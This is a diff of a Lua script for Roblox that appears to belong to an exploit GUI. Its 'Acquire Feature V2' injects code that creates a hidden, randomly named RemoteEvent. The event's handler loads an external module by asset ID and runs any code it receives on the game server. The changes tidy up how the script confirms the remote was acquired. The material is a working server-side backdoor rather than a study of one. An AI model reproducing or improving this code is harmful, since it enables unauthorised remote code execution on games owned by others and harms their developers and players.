@@ -147,6 +147,7 @@ end)
 
 Acqur.MouseButton1Click:Connect(function()if not isAcquiring then 
 	isAcquiring = true 
+	AcquiredRemote = nil 
 	local RequiredName = string.char(math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90))
 	local AcquireCode = 'local a = Instance.new("RemoteEvent",game:GetService("Players"):WaitForChild("'..game:GetService('Players').LocalPlayer.Name..'")); a.Name = "'..RequiredName..'"; a.OnServerEvent:Connect(function(plr,code)require(14132891321):SpawnS(code,workspace)end);' 
 	Cody.Text = "-- Acquire Feature V2\n-- Acquiring, please wait..."
@@ -158,10 +159,9 @@ Acqur.MouseButton1Click:Connect(function()if not isAcquiring then
 		end 
 	end end 
 	wait(10)
-	if game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) then 
-		local SelectedInstance = game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) 
-		if SelectedInstance:IsA("RemoteEvent") then 
-			AcquiredRemote = SelectedInstance 
+	if game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) then  
+		if game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName):IsA("RemoteEvent") then 
+			AcquiredRemote = game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) 
 			Cody.Text = "-- Acquire Feature V2\n-- Successfully acquired!" 
 		else 
 			Cody.Text = "-- Acquire Feature V2\n-- Failed to acquire a remote!" 
